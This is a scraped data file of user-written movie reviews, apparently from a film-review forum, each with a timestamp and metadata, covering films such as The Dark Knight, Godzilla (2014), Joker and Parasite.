1648002014.0,Windfall (2022),"I think this is a bad film. I saw a lot of Google reviews either saying that this was terrible because it was too woke or too slow. And I think both of those arent even true. Yes I understand the billionaire is made out to be a bad person but that's not exactly unbelievable, what is unbelievable is how the whole situation goes down. The acting and everything was good but just. The idea that the two married people would act like this is just quite silly to me. The idea that the robber would go back and do any of what he ended up doing doesn't really make any sense. But for me the most annoying thing is the wife being written in such a patronizing way. Like shes a helpless victim in the marriage, and it's only now that shes started to realise how bad the partnership is. It's like they try to play that so the audience can sympathise with her in the final twist which is just ridiculous. Then the soppy-ass silly ""this is how I feel"" speach by Jason seagal's character which is like built to be the emotional climax of the film is just.... just cringe. There where a lot more things that bugged me but this is all I felt like saying for the moment.",moviereviews,1156,223,25,0
1647380309.0,Deep Impact (1998) movie review,"Deep Impact is a rare Hollywood coincidence, where two very similar projects that are released around the same time, Armageddon also came out in the Summer of 1998, both did well at the box office, with Armageddon doing better. Of the two films, Deep Impact is the better film, but Armageddon hits on a more emotional note. As I’m reviewing all of Bruce Willis’ films, I’ll review it at a later point. Both have star studded casts, and personally I prefer Armageddon, even though I found the astronauts in Deep Impact to be more heroic.

1646231238.0,The Dark Knight (2008): 10-Category Review,"The Dark Knight defines its generation. Its story is potent with emotion and excitement. The script isn't artistic, but it's genuine entertainment with significant substance. The protagonists have their ideals challenged by the Joker. Each character represents a different vision of justice (order, chance, chaos) and each position is convincing. Furthermore, the plot is a natural progression. Batman reduces crime, but it evolves and creates a rising panic. Bruce Wayne's relationships are strained, he loses loved ones, and the ending is bittersweet. Plus, the acting is electric. Heath Ledger provides an all-time performance, elevating The Dark Knight to a legendary level.

Meanwhile, The Dark Knight is a technical force. It has Nolan's consistent craftsmanship, but goes above and beyond. The cinematography has meaning, using arcs and upside-down shots to convey madness. The sound is sleek yet gripping, with symbolic touches. The editing seamlessly blends storylines. The epic music is measured and heightens suspense. Additionally, the Joker's costume is nearly as iconic as Ledger's performance. Lastly, the effects are truly grandiose, actually vertically flipping semitrucks and blowing up entire hospital buildings. Overall, The Dark Knight is a symphony of skilled entertainment and a film for all audiences.

1645311858.0,"Godzilla (2014) is good, but not perfect","Before I start this review, allow me to provide some of my own history with Godzilla. I remember first becoming a Godzilla fan in 2011.  Before I became a fan, I had heard of Godzilla, but I didn’t know who he was at the time. I loved watching King Kong (1933), but I was curious about Godzilla. I looked up some information about Godzilla, and ended up watching [this.]( After I watched that, I became immediately hooked. I got a few of the toys, got a couple of the video games, and got most of the movies. (Only missing two of them). Hell, I even named my personal Instagram account after Godzilla. 

After I watched Godzilla: Final Wars, I noted how it was sad that this may be the last Godzilla movie. (At the time, I didn’t know that Godzilla was just taking a ten year break). As soon as I heard that America was bringing Godzilla back, (this time the right way), I was so excited. All of the trailers and tv spots (as well as the toys) looked promising, and I had high hopes for it. The movie was released on May 16, 2014, when I was still in 7th grade. After the day at school was done, my dad took me and my brother to go see the movie that night. Since it was opening night, I expected the auditorium to be full, but there was only a small amount of people there. (About 15-20 people in total). Of course, I loved the movie, but now that I’m older, my views have changed, but only a little. 

Positives: 
* A few of the human characters. As in most Godzilla movies, the human characters seem to be a mixed bag. Normally, there’s one or two that stand out to me. In this movie, you get exactly that with Joe Brody and a few of the Monarch scientists. Joe completely steals the show and is amazing every scene he’s in. Only problem is that he should’ve been in the whole movie. It was a bad idea to kill him off at the end of the first act. Dr. Ishiro Serizawa is great too. He delivers an awesome line, (“Let them fight.”), and makes the movie feel less boring. 
* The MUTOs. In my opinion, the MUTOs were great opponents for Godzilla and pretty cool monsters overall. I like how both of them can unleash electromagnetic pulses (technically speaking, the male can unleash it from its claws, while the female surrounds herself with an EMP field), and the two of them together can be a match for Godzilla. The designs of the two are cool and you can tell where they got the inspirations of the two designs from. 
* The tone of the movie. Like in Godzilla (1954), and in other Godzilla movies, the tone is dark and serious. I think this works in this movie, and the soundtrack adds to why the tone works. 
* Godzilla himself. I love this new Godzilla. Unlike the last time America tried their hand at Godzilla, this one is obviously better. The design is more faithful to the character, he causes a lot more destruction, and he actually breathes fire. Every scene with Godzilla was breath taking. Even his intro scene in the airport was awesome, and I love how the scene went. Only problem is that Godzilla is only in the movie for 8 minutes. (A problem that the sequel makes sure to fix right off the bat).

Negatives:
* The main characters. The character of Ford Brody is terrible. His acting is terrible, and I don’t feel the connection he has with his wife. I also don’t like how instead of trying to get back to his family, he immediately jumps from one military unit to another. His wife, however, is actually a good character. She cares about the situation that’s going on and does a good job. The son acts just as wooden as Ford does.
* Turn on the light. While the monster action is good, I can hardly see what is going on. The only times I can actually tell what’s going on is whenever Godzilla shoots his atomic breath.
* Stop teasing us. Like I said before, Godzilla’s first appearance is amazing. He’s roaring and gets everyone excited, but then it cuts to something else. The whole movie is like this too. Whenever it looks like the monsters are going to fight, the movie cuts to something else. The movie still gives us a good final fight, but it still continues to cut away from the action.

Overall, this is a great welcome back for Godzilla, but not the Godzilla movie that everyone was expecting. 7/10",moviereviews,4227,790,114,0
1645283827.0,Texas Chainsaw Massacre (2022): 10-Category Review,"Texas Chainsaw Massacre is a scam. It's hardly even a movie since its only concern is violence. There are some minimal attempts at hackneyed characters and plot, but those are incredibly shallow and swiftly abandoned. A vast majority of the film's short runtime is solely dedicated to repetitive Leatherface attacks. That might sound enticing, but it gets old fast. It's difficult to connect with hollow characters who make contrived decisions and get into an endless cycle of predicaments. Because the story is so thoroughly discarded, Massacre quickly devolves into numbing, structureless chaos. It's equivalent to YouTube clips of mindless action.

Meanwhile, Texas Chainsaw Massacre is poorly made. There are moments of interesting visuals, proactive editing, and weighty sound, but those are few and far between. More often, those fronts are bland and disengaged. Similarly, the music contributes little to the experience because it is forgettably generic. Furthermore, Texas Chainsaw Massacre looks cheap because the setting is confined, the makeup is unconvincing, and the effects are weak. Plus, the cast is clearly inexperienced because nobody is charismatic, unique, or believable in their roles. Overall, Texas Chainsaw Massacre is an empty shell of a movie that offers almost nothing.

1641524764.0,DON'T LOOK UP is a heartwarming fantasy,"  

With incredibly rare exception, any work of fiction is designed to put us in the position of the protagonist. You have felt the fear of facing Darth Vader in a cloud city. You have been swept away by doomed romance on the Titanic. You have imagined your own crucifixion. By embracing, in our imaginations, the dramatic circumstances of a story, we sense the weight of what is at stake. If the work of fiction is well executed, we feel risk and uncertainty as a hallucination of consciousness until the story is over and the spell is broken.

Tonight, I watched Don’t Look Up, a movie premised upon Earth facing certain annihilation by comet in six months’ time. Accepting the illusion during my viewing of the film, I was entirely at peace. The prospect of imminent death, death beyond my control, was more calming than any thought which has flittered through my mind during this era. My first reaction was sensical: I have the power to destroy the world (as it exists from my point of view) any time I so choose. But to do so would stain my hands with responsibility. 

In The Last of the Mohicans, one character mercifully shoots an arrow through the heart of another character who is being burned alive. A comet would be so clean, so comfortable, so blameless. At the end, as a bonus, I would know a likely solution to the Fermi paradox. L’appel du vide, that’s the itch Don’t Look Up scratches, at least for me. Others are already discussing the quite relevant climate crisis allegory the film presents, which is a fine discussion, but that aspect of the movie didn’t engage me at all.

I don’t think I’m alone in my reaction to Don’t Look Up. I don’t think I’m the only one whose pulse lowered and leveled while contemplating circumstances that had Leonardo DiCaprio and Jennifer Lawrence’s characters spiraling into rage and despair. What I have left to lose, I want to lose, but not because I gave up. Not because someone else took what I have. 

Also, I considered what I would do with my last six months. Sure as shit wouldn’t be what I’m doing now. That freedom called to me as well, and that is how I know I am a slave: because my very existence is a prison which I dream of escaping. I quit smoking a couple weeks ago, but damn, I want a cig right now.

Anyway, good movie. They’ll probably get awards or whatever. I’m going to get some more wine. Maybe a cigarette…",moviereviews,2382,431,55,0
1641392427.0,Being the Ricardos (2021): 10-Category Review,"In true Aaron Sorkin fashion, Being the Ricardos is a rollercoaster of fascinating conversations. Almost every scene tackles multiple issues, yet Sorkin keeps it clear and concise. Gradually, the story builds, becoming rich in themes of home, prejudice, and ambition. Yet, Being the Ricardos ultimately focuses its attention on the world's discomfort with powerful women. Therefore, Nicole Kidman's fiery performance influences the entire production. She is sharp, assured, and, deep down, afraid of losing it all. Because Kidman is so convincingly layered and the supporting cast is equally dynamic, the acting drives the film as much as the whip-smart writing.

Plus, the filmmaking of Being the Ricardos might not match its emotional backbone, but it is still technically proficient. The visuals provide cohesive color schemes, light camera movement, and occasionally aesthetic shots. The editing paces the film briskly, yet gives key beats time to breathe. The production design is detailed and sells the time period. Lastly, the direction balances the snappy humor and the painful dramatics into a potent tone of somber recognition. Overall, Sorkin's clever script and the excellent cast are supported by solid cinema, creating an effective experience. Assuredly, Being the Ricardos is worth a view.

1640539978.0,Guillermo del Toro’s ‘Nightmare Alley’ is stunning.,"Guillermo del Toro creates a visually beautiful movie with great acting that is well paced and engaging. An all star cast lead by Bradley Cooper, who gives what is sure to be one of his greatest performances. A traveling loner joins a circus who then learns the art of Mediumism and conning people of their money. 
The movie takes its time with a slow burn and allows the viewers to become equated with a cast of interesting characters. The movie is beautifully shot giving a realistic scene of America in the 1930s’ and 1940s’. 
The main protagonist, an ambitious carny Stan Carlisle (Bradley Cooper) becomes involved with a female psychiatrist who might be more manipulative than he is. 
This movie is a giant arm wave to the Academy awards, and it should get their attention. This could be the year for Bradley Cooper. 
This movie is definitely worth the time, I highly recommend it.",moviereviews,886,154,13,0
1640186512.0,The Matrix Revolutions (2003): 10-Category Review,"On its own, The Matrix Revolutions is fine sci-fi. However, when it's inevitably compared to the original, The Matrix, it is disappointing. The more interesting comparison is to Reloaded, where Revolutions actually stands a chance. Unfortunately, even there, Revolutions is still a technical step down. The editing is less dynamic, the cast is watered down, and the overall direction is not as focused. Reloaded may have been misguided, but at least it had clear intentions. Generally, Revolutions feels somewhat generic. The action is more forgettable and the plot is average. The magic of the original is mostly lost here.

Yet, Revolutions isn't all bad. For one, it is far more concise than its predecessor. Revolutions isn't as intellectually ambitious as Reloaded, but it's also less obnoxious. The film falls into common sci-fi tropes but does so with relative efficiency. Plus, many Wachowski staples are still present: the cinematography is striking, the music is dramatic, the sound is flashy, and the production design is extravagant. The Wachowskis may have fumbled the script, but this project was constructed with noticeable craft. Thus, despite the dichotomy of honoring/failing its origins, Revolutions actually lands in-between as an adequate film.

1639746175.0,Spider-Man: No Way Home (2021): 10-Category Review,"Spider-Man: No Way Home is clever fan service. The usual MCU self-references are present, but No Way Home takes a step further, acknowledging previous Spider-Man eras as its central story. Turning references into legitimate plot points deserves credit. Furthermore, the cast is truly stunning and the main selling point here. The film successfully brings all these eras together and gives everyone time to shine. Naturally, this all helps the acting too because the excellent cast clearly enjoys their roles. Add in the patented MCU filmmaking baseline, and the result is a surefire hit.

However, No Way Home's gimmicks do not make a masterpiece. On a technical level, the film is still basic MCU. Occasionally, there is abstract sound and visual craft, but those aspects are mostly standard. The same goes for the editing, music, and production, which all meet (but rarely elevate) the material. Lastly, the writing and direction both get lost in the massive shuffle. This is the most epic MCU Spider-Man, and, unfortunately, the least heartfelt. The tone isn't focused and the emotional beats aren't earned. The attempts are decent, but don't resonate amongst the excitement. Nevertheless, No Way Home is certainly everything the fanboys want.

1638799190.0,Wolf (2021): 10-Category Review,"Wolf is a thoughtful production about allowing others to be themselves. It is blunt and one-note, but its message is important and presented in an underrepresented population. Viewers might find Wolf strange because it revolves around unusual people, but that is the point. Wolf intentionally depicts some of the least accepted people around with valid humanity. Because of that, its sanctimony is forgivable. Just because a movie is delivering a lesson in an obvious way, doesn't make it bad. If that lesson is relevant and honorable, it is worth paying attention to.

Additionally, Wolf has excellent craft. Its cinematography is purposefully rigid and sterile, including many divisive and confining lines. Meanwhile, the editing and sound are methodical, with occasional dynamic bursts. Together, this conveys the difference between the lively world these characters long for and the stern world they are forced into. Furthermore, the acting is terrific because these exotic characters truly feel real. They could've easily felt disrespectful or artificial, but each cast member shows a deep regard for their portrayal. Collectively, this makes for a detailed experience with a focused and applicable moral. It might not be groundbreaking, but Wolf is honest art.

1638218370.0,Mean Girls (2004): 10-Category Review,"Mean Girls is a modern classic because its strengths are significant. First, the cast is spectacular. They were hot at the time (Lohan), have blossomed since (McAdams and Seyfried), and transcend eras (Fey and Poehler). Meanwhile, lesser known actors (like Caplan and Surendra) excel in their roles. Next, the acting is superb. Everyone's comedic delivery is on point and Lohan's character evolution carries the plot. Cady's downfall and redemption could've come off unconvincing, but Lohan plays it perfectly. Mean Girls hinges on a delicate balance of cartoonish comedy and relatable drama, which the entire cast nails.

Lastly, the writing drives Mean Girls. Superficially, it might seem like another teen comedy, but Mean Girls is special because it's extremely witty. There is an abundance of laugh out loud moments, quotable lines, and food for thought. Tina Fey is known for writing elite comedy with biting social commentary, and Mean Girls is a prime example. This film might not be particularly noticeable from a technical standpoint, but its strengths more than make up for that. A great script brought to life by an exceptional cast is everything a comedy needs, which is why Mean Girls is a standout of its generation.

1637448154.0,King Richard (2021): 10-Category Review,"Much like the character it studies, King Richard is motivational yet a bit tiresome. King  Richard provides a charismatic and complex protagonist in Will Smith while also addressing important themes of racism, classism, and determination. So the film definitely deserves credit for marrying entertainment with enlightenment. However, King Richard falls short of excellence because there isn't much else to it. Yes, Smith is terrific, but not otherworldly enough to make a masterpiece on his own. Unfortunately, the experience eventually feels one-note after a while.

First, the other characters are underwritten. Aunjanue Ellis excels with what she's given, but her scenes are sparse. Meanwhile, little time is spent on Venus and Serena as people. Obviously, King Richard is fundamentally about Richard Williams, but the supporting cast simply doesn't have much to work with. Next, there is the filmmaking, which is strictly adequate. The cinematography, editing, and sound design are plain with occasional highlights. None of these fronts are bad, but none are particularly engaging either. Really, the only significantly positive note outside of Smith is the soundtrack, which emphasizes the era and the climatic moments. Overall, King Richard is certainly good but lacks the complexity to be great.

The only plot you care about in this movie is seeing Godzilla and Kong fight each other. Now I would like to specify I did watch this movie in theaters so I don’t know how good it as at home. 

This movie most of the time, had my hair raised. Watching the is movie in the theaters is very fun and I had a great time watching this movie. When Godzilla and Kong first started fighting a big grin went on my face because of how they built it up with when they were on the boat. I would fully recommend this movie to about interested in watching it and if possible watch it in theaters. It can get kinda boring when the humans are on screen. I don’t even remember a single characters name other than King Kong and Godzilla. That’s how little this movie cares about the humans.

1618956310.0,What's Eating Gilbert Grape,"(This post is for school, sorry if its not a full review)

When Watching this movie I wanted to really focus on the struggles of both Arnie Grape and his family dealing with Arnie's Condition. I noticed in the start of the movie that Arnie was a source of fun and light for the family who have fallen on hard times. Arnie almost seems to rally the family together because he needs them and loves them all unconditionally. Just as the family does him. As the movie progresses however it starts to show the, at times, extreme attention and effort it takes to take care of someone with a mental disability. Arnie does not realize the stress he is putting on his family (Gilbert in particular) and it starts to take its toll on the family. Arnie required constant attention. Proof of this is when Gilbert becomes distracted by conversation with Becky and as a result of the distraction Arnie sneaks off and climbs the water tower, getting arrested in the aftermath. Again, not Arnie's fault as he doesn't know any better. But this movie does a good job showing the work it takes to properly take care of a child/person with a mental disability. It also shows the frustration that can come with it at times. (I know that in this movie Gilbert had a lot of other factors driving his frustration as well) To wrap up this post, I think that this movie did a fairly good job at portraying the attention some people with mental disabilities require and the effect that it could have on their families, especially if the family is struggling to get by.

1615299131.0,The most brilliant film I’ve ever seen.,"One of my favorite films is ""Parasite”. Despite the fact that the film's plot reflects social inequality, it is presented straightforwardly and simply. Throughout the story, the film asks us to ask questions in our heads. More than that, it is excellent in terms of production. Every point of view, color grading, and sound effects are meaningful and exciting, drawing the audience even deeper into the film. Overall, it's still a fantastic film with a great script. To make it more understandable, the film concerns heavy topics like class and social inequality. The audience can answer the question at the end of the story that the villain of the story is not the poor or the rich, but social inequality, which causes people to be villains.",moviereviews,742,126,21,0

This movie is so bad that the only way I could even get through it was by playing a game where I had to take a drink every time there was an awkward stare or more than a few seconds of silence. Well, I made it all of the way to the end, but I ended up dying.

When I arrived at the pearly gates of movie heaven, God felt so bad that I watched this; he showed pity on me and sent me back to earth as his messenger to inform you not to watch this movie. In fact, he said that he will not forgive anybody involved in the production of this trash. His exact words were, ""Yeah, it was that bad...will somebody please give me my 90 minutes back?"" 

My version of hell would be spending an eternity with my eyes taped open while this movie played on forever. Please do me a favor and save yourself an hour and a half by literally doing anything else besides watching this movie.

1612253305.0,Cut Throat City! Was it Trash or Was it Just me????,"Just finished watching Cut Throat City on Netflix. Looking at the cast line up it looked to be more than just another b-rated movie. Up and comers Denzel Whitaker and Demetrius Shipp Jr had me excited for this one, staring next to names like T.I., Terrence Howard, Ethan Hawke, Kat Graham and Isaiah Washington. But I should have known all bets were off on this being a decent movie when I saw Wesley Snipes was in it.

This movie takes place in New Orleans after Hurricane Katrina. It's about four boyhood friends, who turn to crime in order to make ends meet after the Hurricane. I thought this was going to be a great move with T.I playing another gangster role but the plot kept moving in such a weird direction its like the writer didn't know where he wanted to go with this movie. Most of the supporting characters in this movie had such a vague background it made a lot of the dialog and premise for their actions hard to understand. At some points in the movie they keep talking about city official corruption on a large scale but they never really get in to it what was done before Katrina. I'm still trying to figure out what role or what was the point of having Terrence Howard or Wesley Snipes even in this movie. Its like they brought Wesley Snipes in to be a look alike of Samuel L. Jackson's character in Black Snake Moan and Terrence Howard just to have another big name in the movie.

There are just so many WTFs in this movie that they never answer or circle back to. Like the crocked cops that showed up at the Casino robbery in the start of the movie. They talk about it once or twice but never say how they knew what was going down or who sent them. This movie is just filled with so many elements and ideas that are never finished or talked about. They introduce a handful of things in this movie but never add any substance or closer on these things.

Wu-Tang rapper Rza directed this and I really think he is better off sticking to music or acting because this could have been such a better movie with the cast that they had.

1612186671.0,Pan's Labyrinth Review 5/5,"   
Pan's Labyrinth is a dark fairy tale about a girl called Ofelia who has to complete three quests for a faun before a full moon after venturing into a stone labyrinth. This fantasy quest is only half of the film for in reality the film is about a pregnant woman and her daughter going to live in a large mansion with a tyrannical stepfather. The film is set against 1944 Spain during the Nazi Occupation. The film stars Ivana Baquero, Sergi López, Maribel Verdu and Doug Jones. It is directed by Guillermo Del Toro.  
Guillermo Del Toro is a very interesting filmmaker to say the least. His films range from comic book adaptations, to strange love stories, to action films about robots punching kaiju's in the face. And Pan's Labyrinth is a brilliant introduction to his filmography. There are quite a lot of people who hold this film in very high regard. British film critic Mark Kermode even said it is the modern day Citizen Kane (a film I will review at some point.) And while I wouldn't say that, I can definitely acknowledge the brilliance of Pan's Labyrinth.  
Dark fairy tale is probably the best way to describe this film. A lot of people have said that Pan's Labyrinth is the sister film to one of his other films called The Devil's Backbone. That film is a mournful fairy tale which is set against the backdrop of the Spanish Civil War.  
The fantasy aspects of this film contrast very well with the real world. In the end it is shown that the fantasy aspects are all fake, but there are justifications for what happens in the film. Ofelia is a young girl who is obsessed with fairy-tales. She loves reading books about them and her worldview and morality are all based around the black and white simple nature if these stories. But Ofelia doesn't live in a world of black and white, she lives in a world covered in gritty greys.  
Before I get into the realities of this world, I want to talk about the symbolism. Some of the symbolism in this film is very smart and innovative, whilst other pieces are more obvious. And I believe that the ones that are more obvious are the ones Guillermo wants you to walk away with in your head. This is best applied to the sequence with the pale man. Aside from the horrific tension you feel and the harrowing performance from Doug Jones. Who by the way is a very interesting actor. The most provocative aspect of this scene is the very obvious holocaust imagery. The pale man is shown to be a blind child eating freak, and in the the camera dies linger in on the corner of the shot where you can see a pile of shoes. Guillermo has said that the pale man is supposed to represent all industrial evils. He also said it wasn't a coincidence that the creature is a pale man. And that is a spicy piece of information that I won't get into here.  
Speaking about the holocaust imagery; I think we now need to talk about the violence, the world, and the characters. This film is less about the horrors of WW2, and is more about the horrific and corrosive nature of the Nazi ideology itself. This film shows a lot of brutal violence. It isn't excessive or romanticised, Guillermo doesn't want a shootout between a group of rebels or a scene if vengeance to look cool. What Guillermo wants it to be is effective, and saying that this film is ""effective"" is a massive understatement. The film is able to give us a lot of perspectives. Because the film only takes place in a large and empty forest, and Captain Vidal's Manor. Speaking of Vidal he is easily one of the most evil and maliciously vindictive villains I have seen in fiction. This character is despicable and Sergi López does a brilliant performance. Other characters like Mercedes, The Doctor, and Ofelia are also brilliantly performed and are very well written.  
One of the best and last parts about this film aside from the characters and symbolism is the practical effects and cinematography. This film is so beautiful and ugly to look at. Since it is Spanish and I needed subtitles it was sometimes hard to tell what the characters were saying fully. But due to the brilliant visual storytelling I was able to understand everything the film was trying to tell me.  
In conclusion Pan's Labyrinth is a brilliant dark fantasy and analysis on Nazisim, and I really recommend it. It is currently free on Prime .",moviereviews,4317,777,82,0

So they destroyed themselves with those terrible discoveries. So it was that the Germans created a variety of fantasy films based on their strange experiments and dangerous developments. So this film can also be called a fantasy creation. This is a horror movie about the fate of a miserable group of sailors. The story of this film is based entirely on a mysterious ship of the Germans.

At the beginning of the film, we see a group of survivors in a small lifeboat trying to board a 

German warship. So somehow they get on this ship, but they get on this unexpected ship of 

death. As the film progresses, viewers are intrigued by the mysterious deaths they see onboard 

the boat. Is this really a zombie attack on the Germans on board? This film manages to create a 

variety of emotions in us. But before the best parts of the film arrive, that curiosity is wholly 

destroyed, and we see the weaknesses of the Tamil film. But the ending of the film is very well

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Ah, the Usual Suspects. My personal favorite movie of all time. Don't let my bias be a fool. Perhaps it's not THE best movie ever, but it's one that I never get tired of.  


If you like flash and bikinis and breath-taking camera angles, you won't find them here. Usual Suspects is not an ""epic,"" and it doesn't pretend to be. It's a modestly-budgeted piece by a fresh director (who later went on to do the X-Men movies, a FAR departure).  


A great, gritty script, beautifully-acted characters, and what many have called the greatest movie ending of all time, are some of the shining qualities that make the Usual Suspects an object worthy of praise above its humble-looking shell.  


The casting is very unusual but somehow fits perfectly. Gabriel Byrne is convincing as the ex-con trying to build a new life when he gets drawn back into his old life. Stephen Baldwin has the role of his career as the smart-mouthed and cocky professional. Kevin Pollak takes a big departure from his usual good comedy self to take a more dramatic role. Benicio del Toro literally takes a one-dimensional character with absolutely nothing in the script to give him character, and he fleshes it out with brilliant mannerisms and memorable mumbling to show incredible acting creativity. Kevin Spacey as we know him was born from this movie. His manners and fast-talking yet shy gimp nature are a treat to listen to throughout the flick.  


Without giving away the plot, the best and most genius parts of the movie are the subtleties. After you see the ending, and the truth hits you like a ton of bricks, you have to watch it again. On the second time through, you'll jump up and point at the screen whenever you spot a clue you missed the first time. It's even possible to watch the movie multiple times and see something new with every viewing. It's that attention to detail that make the deceptively innocent-looking Usual Suspects one of the greatest movies of all time.",moviereviews,2099,348,46,0
1597544140.0,Tarantino's Best and Worst,"""Quentinen and Tarantined by Writtin Directino."" 

Are you a fan of Quentin Tarantino? Are you freaked out by the way he likes feet? Do you like his quirks and strong passion for films? Do you just hate him for some weird reason? Or do you love him and think he's a genius? He's kind of an interesting topic I feel like, he's clearly a bit weird but if you ask me he makes some of the best films out there and I can't help but find that whole ""video-store clerk becomes filmmaking legend"" inspiring.

And so came the time in my movie-based YouTube career where I had to make  the decision to finally delve into the obvious topic that everyone would expect from a channel like mine: Ranking his movies. ""Whhaaaaatt oh my god that's crazy"" I hear you audibly saying to yourself. And look, you're right, but calm down for a second and let me tell you that no, while it's not the most original video idea in the world - if it's done right and made well (and I promise this one :) a video like this can STAND THE TEST OF TIME. It's a big deal. 

Lastly and most importantly for a post - what do you think is Tarantino's very best and very worst movies? I'd be interested to see what the differences are between the top and bottom picks.

1592830322.0,Summer of 84 (2018),"I am sure others have said this, but this movie is a perfect blend of Disturbia and Stranger Things. It is not a perfect movie, but it is sure as hell a lot of fun and 100% worth the watch!

I really liked the message of this movie: not everything is as it appears on the surface. This movie is really about young people being forced to grow up too early due to circumstances at home. Woody is needing to take care of his depressed alcoholic mother, Eats has to deal with his parents' aggressive disputes and possibly an abusive father, and Nikki is trying to process the separation of her parents. Of course, the main deception is of Officer Mackey, played by Rich Sommer. He was creepy enough, especially during the scene in which he makes a phone call at Davey's house. The best part of this movie is when Woody, Davey, and Nikki explore Mackey's basement. It was great and while it answered whether or not Mackey was guilty, it still allowed for your imagination to fill in the holes of what exactly it was that Mackey was doing down there. Very scary and creepy, and successfully executed! It is good sometimes to let the audience assume, and not outright show us what Mackey was doing to his victims.

There were certain scenes that felt unreal or out of place. For instance, I am still not completely sure why Nikki went over to Davey's in the first place and started to show him attention? I guess it was mainly because she needs a buddy to talk her through her parents' divorce? Furthermore, Rich Sommer did a fine job in the movie. My only qualm with him was his final threat to Davey...he was trying to be intense and super threatening. I just wasn't feeling it. However, this movie earns points for Graham Verchere (Davey). He was the best part of this movie and gave an excellent performance. He was fun to watch and I can see him having a successful career as an actor.

1581199211.0,Is Joker actually a good movie?,"On the eve of the Academy Awards, I just wanted to ask the question. “Shocked” isn’t a strong enough word to describe my amazement that THIS film was the years most nominated. 

Yes, Jaoquin’s performance is electrifying.. but a strong lead isn’t enough to save an entire film. The quintessential example of this IMO is Training Day. Yes, Denzel is fun to watch and the movie itself is entertaining.. but it is so grim, over the top at all the wrong moments and if the first act is “believable,” then the last takes a nose dive into “ridiculous” as the film itself turns into a meaningless parody of the movie it started out as... and Joker follows almost this exact same formula.

But, forget the continuity errors or the obvious questions that Joker forces us to ask - like, how old is this guy when he’s fighting Batman?! - and focus only on Joaquin and his character and a new question starts to emerge; why did this Joker need to be made? 
I’m not trying to take anything away from Phoenix and his performance.. I just feel as though his character is too derivative of Ledger’s to really feel necessary.. I think one could even make the argument that while TDK helps this film stay interesting, “Joker” does little for the character’s canon.

This is no plot. There is no plot. There’s absolutely no plot. A cat comes in sings for a bit and then another and then another and then another and Fuuuck.

And not the good kind of creepy that you get from a trippy horror movie like Society or Suspiria. It just looked wrong, like if someone in the theater was to just turn the movie off, everything would be easier on my eyes and my life.

1576970036.0,The Rise Skywalker Review: A film with the hit and miss ratio of a storm trooper,"[Check out the review on the website...](

So it’s taken me a couple of days to compile my thoughts on this film. I attended a midnight screening on the 19th but even having that extra time to write a review wasn’t enough. I honestly need to see the film again to fully form my opinion of it but given the time of year that’s tall order. My one viewing will have to do.

So first let me qualify my Star Wars credentials. I saw the original trilogy pre-special editions on VHS. The prequels were the Star Wars of my childhood but I still consider the original trilogy to be superior. I’ve been to midnight screenings the past five years in a row. Still own all of my Star Wars toys from when I was a kid. And my home video collection is so ridiculous that yes…I even own Revenge of the Sith on VHS. I’m a fan.

So talking about The Rise of Skywalker probably first requires talking about the rest of the trilogy first. The Force Awakens was essentially just a quintessential Star Wars story that used this familiarity to introduce a whole heap of new elements that could be explored in the rest of the trilogy. It was a bridge between old and new. The Last Jedi took apart what we expected from Star Wars. It tore down the stereotypes and changed the expectations we have of our heroes. It was embodying this new.

The biggest issue with The Last Jedi becomes a really big issue with The Rise of Skywalker. TLJ does nothing to setup the next movie. It feels more or less wholly contained. Where The Force Awakens created this large sandbox within which to play The Last Jedi was a small movie that was more concerned with themes than plot. It’s as if it didn’t know that it was part TWO of THREE. I didn’t expect that at the end of the sequel trilogy The Force Awakens would be my favourite.

The Rise of Skywalker is very messy. It’s an incredibly fast moving movie and it has to be. A huge portion of the of the movie is spent establishing a plot that should have been setup in the previous film. It’s not bad stuff but it’s not a good way to do it. It makes the film essentially a film and a half. It really brings to light the biggest shortcoming of the trilogy which is its lack of a singular creative voice.

Though this issue rears its ugly head in this installment it’s not this films biggest problem. The pacing issues aside my biggest gripe was the fan service. I wanted all of the questions answered and I wanted to see all the characters again. But what I didn’t want was the film to be so self aware that it was giving me what I wanted. There’s a lack of subtlety in the film. There’s quite a few details that feel more like studio decisions rather than filmmaker decisions.

In the wake of fan backlash to The Last Jedi and poor box office performance of Solo it appears as though Lucasfilm has tried to ensure that this film meets expectations. But films made by committee never work out. Even if it’s a producer or writer a film series needs someone to control what the story is going to be. Collaboration is fine but contradiction isn’t.

I’m so torn on this film. Like with every Star Wars film we get I’m just grateful to have more Star Wars. I’m excited for the ancillary material that will further tie up the loose ends but I wish that this film was more satisfying on its own. Hopefully I can get past the cringe of the knowing nods and fall in love with the hopeful science fantasy that this film ultimately is.

1575736585.0,Train To Busan (2016),"On occasion being a horror fan has it's difficulties, especially if you enjoy the zombie genre. Being that the abundance of zombie films released in the past 20 years alone is enough to make most non-hardcore zombie buffs forgo this category due to overuse of cliches and a lack of potent horror. In reality the oversaturation seems to exist more in American cinema. Films such as Dead Snow, REC, Pontypool, and Shaun of the dead should provide enough indication that the genre still has potential. Which brings me to this gem that was gifted to the world in 2016; Train to Busan. The directorial debut from Yeon Sang-ho revolves around a father and his daughter on a bullet train through Korea during a zombie outbreak. Other zombie movies have dabbled in claustrophobic environments, but fail to retain that dread for extended periods. Given the tight areas the characters are given to work with, the sparse moments where they catch their breath are not only vital for them, but the audience as well. Gong Yoo and Kim Soo-Ahn's arc may be focused on more often than the others, but this film heavily obliges that you reconsider treating side characters any less than the main two, and I can't help but appreciate that approach. Despite that, Ma Dong-Seok leaves the biggest impact with his role. The high production level design of the zombies combined with the profound use of tight spaces make for a unique and pleasant experience that non-zombie fans can respect too.

1575429033.0,Review of Joker **SPOILERS**,"The film Joker staring Joaquin Phoenix, follows the story of Arthur Fleck and the slow transformation into becoming known as Joker. By day Arthur works as a party clown on the dark streets of Gotham city, and at night he treads up the stairs to his apartment to take care of his mother, and dreams of becoming a famous comedian. Early into this story as he is talking to his psychologist we find out that Arthur has severe mental illnesses, and is on several medications that don’t show progress for him. Throughout his life Arthur has been subjected to being physically abused and beaten by strangers in the street, and is lied to by his mother who is the one person who really loves him. All he really dreams of is being a comedian and going on his favorite show, The Murry Franklin Talk Show. After years of trauma his illness grabs a hold of his mind and he has now committed many murders. He is now known as joker, and starts a uproar of riots against Gotham’s wealthy. His dream of going on The Murry Franklin Talk Show comes true, but he brings a loaded gun on to the show and things go south. The film ends with Arthur in Arkam Asylum, and leaves the audience questioning what really happened. The controversy surrounding this film is due to the gun violence and dark themes that can be considered disturbing. However, these theatrical elements are often used in many films, and specifically psychological thrillers. 

